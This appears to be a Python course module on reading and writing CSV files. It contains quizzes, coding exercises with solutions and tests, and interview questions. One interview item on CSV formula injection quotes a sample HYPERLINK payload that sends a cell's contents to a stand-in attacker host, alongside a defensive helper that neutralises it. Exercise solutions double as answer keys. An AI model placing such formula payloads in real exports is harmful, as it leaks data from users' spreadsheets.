        'csv.reader(f, delimiter=";")',
        { text: 'csv.reader(f) — it detects the delimiter automatically', why: 'The reader always uses the dialect you give it (comma by default). csv.Sniffer can guess, but reader doesn\'t.' },
        { text: 'csv.reader(f, quotechar=";")', why: 'quotechar is the character used to wrap fields, not the separator.' },
      ],
      answer: 1,
      explanation: py`The separator is the \`delimiter\` format parameter. Everything else — quoting, doubled quotes — works the same.`,
    },
    {
      id: 'csv-data-q7',
      type: 'short',
      prompt: 'A CSV export has a column of UK phone numbers like `07700900123`. Why shouldn\'t you convert that column with `int()`, and what else must you always do yourself when reading CSV?',
      answer: py`A phone number is an identifier, not a quantity: \`int("07700900123")\` drops the leading zero and you can't get it back. Keep IDs, phone numbers and postcodes as strings. More generally, CSV stores only text, so you must decide and apply every type conversion yourself (int for counts, Decimal for money, dates with fromisoformat), and decide what empty or malformed cells mean.`,
    },
  ],

  // -------------------------------------------------------------- exercises
  exercises: [
    {
      id: 'best-per-subject',
      title: 'Top of the class',
      difficulty: 'intermediate',
      prompt: py`\`grades.csv\` has the columns \`name,subject,score\`. Write \`best_per_subject(path)\` that returns a **dict** mapping each subject to a **tuple** \`(name, score)\` for the highest score in that subject, with \`score\` as an **int**.

- If two students tie, keep the one that appears **first** in the file.
- Skip rows whose \`score\` is empty.
- Use \`csv.DictReader\` and open the file with \`newline=""\` and \`encoding="utf-8"\`.

For the project's file: \`{"maths": ("Ada", 91), "history": ("Cy", 85), "physics": ("Ben", 64)}\`.`,
      files: {
        'main.py': py`import csv


def best_per_subject(path):
    """Return {subject: (name, score)} for the top score in each subject."""
    best = {}
    # TODO: read the CSV with DictReader and keep the best row per subject
    return best


print(best_per_subject("grades.csv"))
`,
        'grades.csv': GRADES_CSV,
      },
      hints: [
        'Loop over csv.DictReader(f). Convert int(row["score"]) — after skipping rows where row["score"] is "".',
        'Replace the stored entry only when the subject is new, or the new score is strictly greater (>) than the stored one — that keeps the first on a tie.',
        'if subject not in best or score > best[subject][1]:\n    best[subject] = (row["name"], score)',
      ],
      solution: {
        explanation: py`\`DictReader\` gives each row as a dict of strings, so the score is converted with \`int()\` before any comparison — comparing strings would rank \`"9"\` above \`"85"\`. Empty scores are skipped first, because \`int("")\` raises \`ValueError\`. The dict holds the best \`(name, score)\` seen so far per subject; using a strict \`>\` means a later equal score never replaces an earlier one, so the first student in the file wins ties. The file is read once, row by row, so this works on files of any size.`,
        files: {
          'main.py': py`import csv


def best_per_subject(path):
    """Return {subject: (name, score)} for the top score in each subject."""
    best = {}
    with open(path, newline="", encoding="utf-8") as f:
        for row in csv.DictReader(f):
            if not row["score"].strip():
                continue                       # missing score: skip the row
            subject = row["subject"]
            score = int(row["score"])
            if subject not in best or score > best[subject][1]:
                best[subject] = (row["name"], score)
    return best


print(best_per_subject("grades.csv"))
`,
          'grades.csv': GRADES_CSV,
        },
      },
      tests: [
        { name: 'the project grades', code: py`assert best_per_subject("grades.csv") == {"maths": ("Ada", 91), "history": ("Cy", 85), "physics": ("Ben", 64)}` },
        { name: 'scores are ints, compared as numbers', code: py`with open("t.csv", "w", newline="", encoding="utf-8") as f:
    f.write("name,subject,score\nAda,art,9\nBen,art,85\n")
assert best_per_subject("t.csv") == {"art": ("Ben", 85)}` },
        { name: 'quoted names with commas work', code: py`with open("t2.csv", "w", newline="", encoding="utf-8") as f:
    f.write('name,subject,score\n"Smith, Jr.",music,70\nAda,music,60\n')
assert best_per_subject("t2.csv") == {"music": ("Smith, Jr.", 70)}` },
        { name: 'empty scores are skipped', code: py`with open("t3.csv", "w", newline="", encoding="utf-8") as f:
    f.write("name,subject,score\nAda,drama,\nBen,drama,40\n")
assert best_per_subject("t3.csv") == {"drama": ("Ben", 40)}` },
      ],
    },
    {
      id: 'export-contacts',
      title: 'Export contacts for a spreadsheet',
      difficulty: 'intermediate',
      prompt: py`Write \`write_contacts(path, contacts)\`. \`contacts\` is a list of dicts that may have **extra keys** (like \`"notes"\`) and may be **missing** some keys.

- Write a CSV with the header \`name,email,phone\` (exactly that order), then one row per contact.
- Missing values become empty cells; extra keys are ignored.
- Names may contain commas and quotes — the file must still read back correctly.
- Return the number of contact rows written (an \`int\`).

Use \`csv.DictWriter\` and open the file with \`newline=""\` and \`encoding="utf-8"\`.`,
      files: {
        'main.py': py`import csv

FIELDS = ["name", "email", "phone"]


def write_contacts(path, contacts):
    """Write contacts as CSV with the columns in FIELDS. Return the row count."""
    # TODO: use csv.DictWriter (hint: restval and extrasaction)
    with open(path, "w", encoding="utf-8") as f:
        for contact in contacts:
            f.write(",".join(contact.values()) + "\n")
    return 0


people = [
    {"name": "Ada Lovelace", "email": "ada@example.com", "phone": "07700900123"},
    {"name": "Smith, Jr.", "email": "smith@example.com", "notes": "prefers email"},
    {"name": 'Ben "Benny" Ng', "phone": "07700900456"},
]
print(write_contacts("contacts.csv", people), "rows written")
with open("contacts.csv", encoding="utf-8") as f:
    print(f.read(), end="")
`,
      },
      hints: [
        'csv.DictWriter(f, fieldnames=FIELDS, restval="", extrasaction="ignore") handles both missing and extra keys.',
        'Call writer.writeheader() once, then writer.writerows(contacts). Remember newline="" in open().',
        'with open(path, "w", newline="", encoding="utf-8") as f:\n    writer = csv.DictWriter(f, fieldnames=FIELDS, restval="", extrasaction="ignore")\n    writer.writeheader()\n    writer.writerows(contacts)\nreturn len(contacts)',
      ],
      solution: {
        explanation: py`\`DictWriter\` maps each dict onto the fixed \`FIELDS\` order, so the column order no longer depends on the order of keys in each dict (the starter's \`",".join(contact.values())\` put Smith's notes in the phone column!). \`restval=""\` fills missing keys with empty cells and \`extrasaction="ignore"\` drops keys such as \`notes\` instead of raising \`ValueError\`. The writer quotes \`"Smith, Jr."\` and doubles the quotes in \`Ben "Benny" Ng\`, so a spreadsheet — or \`csv.reader\` — reads exactly three columns back. Phone numbers stay strings, so their leading zeros survive.`,
        files: {
          'main.py': py`import csv

FIELDS = ["name", "email", "phone"]


def write_contacts(path, contacts):
    """Write contacts as CSV with the columns in FIELDS. Return the row count."""
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=FIELDS, restval="", extrasaction="ignore")
        writer.writeheader()
        writer.writerows(contacts)
    return len(contacts)


people = [
    {"name": "Ada Lovelace", "email": "ada@example.com", "phone": "07700900123"},
    {"name": "Smith, Jr.", "email": "smith@example.com", "notes": "prefers email"},
    {"name": 'Ben "Benny" Ng', "phone": "07700900456"},
]
print(write_contacts("contacts.csv", people), "rows written")
with open("contacts.csv", encoding="utf-8") as f:
    print(f.read(), end="")
`,
        },
      },
      tests: [
        { name: 'returns the number of rows', code: py`assert write_contacts("t.csv", people) == 3` },
        { name: 'header is name,email,phone', code: py`write_contacts("t.csv", people)
with open("t.csv", newline="", encoding="utf-8") as f:
    assert next(csv.reader(f)) == ["name", "email", "phone"]` },
        { name: 'rows read back exactly (commas, quotes, missing values)', code: py`write_contacts("t.csv", people)
with open("t.csv", newline="", encoding="utf-8") as f:
    rows = list(csv.reader(f))[1:]
assert rows == [
    ["Ada Lovelace", "ada@example.com", "07700900123"],
    ["Smith, Jr.", "smith@example.com", ""],
    ['Ben "Benny" Ng', "", "07700900456"],
]` },
        { name: 'quotes are written the CSV way', code: py`write_contacts("t.csv", people)
with open("t.csv", newline="", encoding="utf-8") as f:
    raw = f.read()
assert '"Smith, Jr."' in raw and '"Ben ""Benny"" Ng"' in raw` },
        { name: 'an empty list writes just the header', code: py`assert write_contacts("empty.csv", []) == 0
with open("empty.csv", newline="", encoding="utf-8") as f:
    assert list(csv.reader(f)) == [["name", "email", "phone"]]` },
      ],
    },
  ],

  // -------------------------------------------------------------- interview
  interview: [
    {
      id: 'csv-data-why-not-split',
      difficulty: 'beginner',
      type: 'conceptual',
      minutes: 2,
      question: 'Why use the csv module instead of `line.split(",")` to read CSV files?',
      answer: 'Because CSV has quoting rules: fields containing commas, quotes or line breaks are wrapped in quotes, and quotes inside are doubled. split() ignores those rules and silently splits fields apart or leaves quote characters in. The csv module implements them for reading and writing, and supports other delimiters and dialects.',
      explanation: py`\`'Ada,"London, UK",42'.split(",")\` gives four pieces with stray quotes; \`csv.reader\` gives three correct fields. A quoted field can even span lines, which line-by-line splitting can never handle. On the writing side, \`",".join\` produces corrupt rows for the same reasons.`,
      whyAsked: 'A quick test of whether you know that "simple" formats have edge cases, and reach for the standard library.',
      mistakes: ['"CSV is simple, split is fine"', 'Only mentioning reading, not writing', 'Not knowing about embedded newlines'],
      followUps: ['How are quotes inside a field represented?', 'Why newline="" when opening?', 'How do you handle a semicolon-separated file?'],
      modelAnswer: 'CSV looks like "values separated by commas", but it has quoting rules: a field containing a comma, a quote or a line break is wrapped in double quotes, and quotes inside it are doubled. split on commas ignores all of that, so a value like "London, UK" becomes two fields with stray quote characters, and a multi-line field breaks the row entirely — often without an error, just shifted columns. The csv module implements the rules for both reading and writing, lets me set the delimiter or dialect, and with DictReader I can refer to columns by name.',
    },
    {
      id: 'csv-data-writer-output',
      difficulty: 'intermediate',
      type: 'output',
      minutes: 3,
      question: 'What does this print?',
      code: { lang: 'python', code: py`import csv
import io

buf = io.StringIO()
csv.writer(buf).writerow(["Ada", 'said "hi", left', 3, None])
print(buf.getvalue().strip())` },
      options: [
        'Ada,said "hi", left,3,None',
        'Ada,"said ""hi"", left",3,',
        '"Ada","said \\"hi\\", left","3",""',
        'Ada,"said "hi", left",3,None',
      ],
      correctOption: 1,
      answer: '`Ada,"said ""hi"", left",3,` — the field with a comma and quotes is wrapped in quotes with the inner quotes doubled, the int is written with str(), and None becomes an empty field.',
      explanation: py`The default \`QUOTE_MINIMAL\` quotes only fields that need it. CSV escapes a quote by doubling it, not with a backslash. \`None\` is written as an empty string, so after reading back you can't tell \`None\` from \`""\` — Python 3.12 added \`QUOTE_NOTNULL\`/\`QUOTE_STRINGS\` if you need to distinguish them.`,
      whyAsked: 'Checks precise knowledge of CSV quoting and how Python values are written.',
      mistakes: ['Expecting backslash escapes', 'Expecting None to be written as "None"', 'Expecting every field to be quoted'],
      followUps: ['How would you quote every field?', 'What does QUOTE_NONNUMERIC do when reading?'],
      modelAnswer: 'It prints Ada, then the second field wrapped in double quotes with each inner quote doubled — "said ""hi"", left" — then 3, then an empty field. The writer uses minimal quoting by default, so only the field containing a comma and quotes gets wrapped, and CSV escapes quotes by doubling them rather than with backslashes. Non-strings are written with str, except None, which becomes an empty string, so None and empty strings look the same in the file unless you use one of the newer quoting modes.',
    },
    {
      id: 'csv-data-bom',
      difficulty: 'intermediate',
      type: 'debugging',
      minutes: 3,
      question: 'A script processing an Excel-exported CSV fails with `KeyError: \'date\'` on `row["date"]`, although printing the first line of the file shows `date,amount,payee`. What\'s going on?',
      answer: 'Excel\'s "CSV UTF-8" adds a byte-order mark (U+FEFF) at the start of the file. Read as plain utf-8, it becomes part of the first header, so the key is "\\ufeffdate". Open the file with encoding="utf-8-sig".',
      explanation: py`The BOM is invisible when printed, so the header *looks* right. \`print(repr(reader.fieldnames))\` reveals \`['\ufeffdate', 'amount', 'payee']\`. \`utf-8-sig\` strips a leading BOM if present and reads normal UTF-8 otherwise, so it's a safe default for CSVs from spreadsheets. Other look-alike causes: stray spaces in headers or a different delimiter.`,
      whyAsked: 'A very common real-world data bug; tests debugging technique (repr!) and encoding knowledge.',
      mistakes: ['Renaming the key in code to "\\ufeffdate"', 'Blaming DictReader', 'Not using repr() to inspect invisible characters'],
      followUps: ['How would you write a CSV that Excel opens correctly with accents?', 'How would you normalise headers defensively?'],
      modelAnswer: 'The file almost certainly starts with a UTF-8 byte-order mark, which Excel adds when saving as CSV UTF-8. When I open it with plain utf-8 the BOM character is kept and glued to the first header, so the key is really backslash-ufeff-date and looking up "date" fails, even though it prints the same. I would confirm with repr of reader.fieldnames, and fix it by opening the file with encoding utf-8-sig, which strips a BOM if one is there and otherwise behaves like utf-8. I might also strip and lower-case header names defensively.',
    },
    {
      id: 'csv-data-totals-by',
      difficulty: 'intermediate',
      type: 'coding',
      minutes: 6,
      question: 'Write `totals_by(path, key)` that reads a CSV with a `units` column and returns a dict of total units per value of the column `key`, **ordered from largest total to smallest**.',
      answer: 'Stream rows with DictReader, accumulate int(row["units"]) into a dict keyed by row[key], then return dict(sorted(totals.items(), key=lambda kv: kv[1], reverse=True)).',
      explanation: py`Grouping is a single pass with \`dict.get\` (or \`defaultdict(int)\`/\`Counter\`). Dicts keep insertion order, so building a new dict from the sorted items gives the requested order. For ties, \`sorted\` is stable, so equal totals keep their first-seen order.`,
      starter: {
        files: {
          'main.py': py`import csv


def totals_by(path, key):
    """Return {value of key: total units}, largest total first."""
    # TODO
    return {}


print(totals_by("sales.csv", "region"))
print(totals_by("sales.csv", "product"))
`,
          'sales.csv': SALES_CSV,
        },
      },
      tests: [
        { name: 'totals by region', code: py`assert totals_by("sales.csv", "region") == {"south": 175, "north": 160, "east": 15}` },
        { name: 'ordered largest first', code: py`assert list(totals_by("sales.csv", "region")) == ["south", "north", "east"]` },
        { name: 'totals by product', code: py`assert list(totals_by("sales.csv", "product").items()) == [("pens", 215), ("paper", 135)]` },
      ],
      solution: {
        files: {
          'main.py': py`import csv


def totals_by(path, key):
    """Return {value of key: total units}, largest total first."""
    totals = {}
    with open(path, newline="", encoding="utf-8") as f:
        for row in csv.DictReader(f):
            group = row[key]
            totals[group] = totals.get(group, 0) + int(row["units"])
    return dict(sorted(totals.items(), key=lambda item: item[1], reverse=True))


print(totals_by("sales.csv", "region"))
print(totals_by("sales.csv", "product"))
`,
          'sales.csv': SALES_CSV,
        },
      },
      hints: ['Group with totals[group] = totals.get(group, 0) + int(row["units"]).', 'sorted(totals.items(), key=lambda item: item[1], reverse=True) gives the pairs largest first; dict(...) keeps that order.'],
      whyAsked: 'The "group by and aggregate" pattern is the heart of most data tasks; interviewers watch for type conversion and clean single-pass code.',
      mistakes: ['Forgetting int() and concatenating strings', 'Reading the whole file into a list first', 'Sorting by key instead of by total'],
      followUps: ['How would you do this with collections.Counter? (Counter.most_common)', 'How would you handle a missing or invalid units value?', 'How would this look in pandas or SQL?'],
      modelAnswer: 'I open the file with newline="" and stream it with DictReader. For each row I take the grouping value row[key] and add int(row["units"]) into a dict with totals.get(group, 0) — converting is essential because CSV fields are strings. That is one pass and memory proportional to the number of groups. Finally I sort the items by total in reverse and build a new dict from them, which preserves that order. With a Counter I could use most_common() directly; in SQL it would be GROUP BY with SUM and ORDER BY.',
    },
    {
      id: 'csv-data-big-file',
      difficulty: 'advanced',
      type: 'scenario',
      minutes: 5,
      question: 'You receive a nightly 15 GB CSV of card transactions (customer_id, timestamp, amount, merchant) and must produce per-customer totals. The machine has 4 GB of RAM. How do you build it robustly?',
      answer: 'Stream it with csv.DictReader (newline="", explicit encoding) and aggregate into a dict keyed by customer_id with Decimal amounts — memory scales with the number of customers, not rows. Validate the header, convert and validate every field, log or quarantine bad rows with line numbers, and write output atomically. If the number of customers is itself too big, aggregate in a database (SQLite) or sort/partition the file first.',
      explanation: py`Never \`list(reader)\` or \`readlines()\`. Keep \`customer_id\` as a string (leading zeros). Use \`Decimal\` for money. Decide a policy for malformed rows (skip-and-count with a threshold that fails the job). Make the job idempotent and resumable for reruns. Tools: \`sqlite3\` with \`executemany\` and \`GROUP BY\` handles aggregation beyond RAM; pandas with \`chunksize\` or DuckDB/Polars (third-party) are other options. Measure, don't guess, before choosing.`,
      whyAsked: 'Tests streaming, data-quality thinking and knowing when to move to a database.',
      mistakes: ['Loading the file with pandas.read_csv in one go', 'Using float for money', 'Ignoring malformed rows or crashing on the first one'],
      followUps: ['How would you make the job restartable halfway through?', 'How would you detect a file that was truncated in transfer?', 'How would you parallelise it?'],
      modelAnswer: 'I would never load the file whole. I would stream it with csv.DictReader, opened with newline="" and the right encoding, check the header first, and aggregate into a dict keyed by customer_id kept as a string, summing Decimal amounts — so memory grows with the number of customers, not the number of rows. Each field is converted and validated; bad rows are logged with reader.line_num and counted, and if they exceed a threshold the job fails rather than producing silently wrong totals. Output is written to a temp file and renamed. If even the per-customer totals do not fit, I would push the rows into SQLite and let GROUP BY do the work, or partition the file by customer first.',
    },
    {
      id: 'csv-data-csv-injection',
      difficulty: 'advanced',
      type: 'scenario',
      minutes: 4,
      question: 'Your web app lets admins download all user profiles as CSV, and they open it in Excel. A security tester sets their display name to `=HYPERLINK("http://evil.example/?x="&A2, "Click")`. What\'s the risk and how do you mitigate it?',
      answer: 'CSV (formula) injection: spreadsheets may evaluate cells starting with =, +, -, @ (and some control characters) as formulas, which can exfiltrate data or trick users. Neutralise user-controlled cells on export — e.g. prefix such values with a single quote — keep proper CSV quoting via csv.writer, and treat exports as untrusted output.',
      explanation: py`The CSV itself is valid; the danger is in how the *consumer* (a spreadsheet) interprets it. Python's csv module quotes for CSV syntax but doesn't neutralise formulas. A small helper applied to every user-supplied field before writing handles it, following OWASP's CSV-injection guidance. If the export is consumed by programs rather than people, prefixing changes the data, so make it a per-export decision.`,
      code: { lang: 'python', code: py`DANGEROUS_START = ("=", "+", "-", "@", "\t", "\r")


def spreadsheet_safe(value):
    text = str(value)
    return "'" + text if text.startswith(DANGEROUS_START) else text


print(spreadsheet_safe('=HYPERLINK("http://evil.example")'))   # '=HYPERLINK(...)
print(spreadsheet_safe("Ada"))                                  # Ada` },
      whyAsked: 'A security-aware question: separates "the file is well-formed" from "the file is safe for its consumer".',
      mistakes: ['Thinking csv.writer quoting prevents it', 'Stripping characters from all fields, corrupting legitimate data like negative numbers', 'Ignoring it because "it is only an export"'],
      followUps: ['Would you neutralise numeric columns too?', 'How would you test this?', 'What changes if the export is for another program, not a person?'],
      modelAnswer: 'This is CSV or formula injection. The file is valid CSV, but spreadsheet programs treat cells starting with equals, plus, minus or at as formulas, so a malicious display name can build links that leak other cells or trick the admin into clicking. csv.writer only handles CSV quoting; it does not neutralise formulas. On exports meant for spreadsheet users I would pass every user-controlled text field through a helper that prefixes risky leading characters with a single quote, following the OWASP guidance, and leave genuine numeric columns that we generate ourselves alone. I would add a test with a payload like this one.',
    },
  ],

  takeaways: [
    'CSV is plain text: rows on lines, cells separated by commas, quotes around cells that contain commas, quotes or line breaks.',
    'Use csv.reader/csv.writer or DictReader/DictWriter — never split(",") or ",".join().',
    'Open CSV files with newline="" and an explicit encoding (utf-8-sig for Excel exports).',
    'Every field is a str: convert with int, Decimal, date.fromisoformat — and keep IDs and phone numbers as strings.',
    'Summarising is one streaming pass: totals[key] = totals.get(key, 0) + value.',
    'Change dialects with delimiter=";" or "\\t"; report bad rows with reader.line_num.',
    'pandas (third-party) is great for analysis; the csv module is the always-available, streaming, no-guessing tool.',
  ],
}
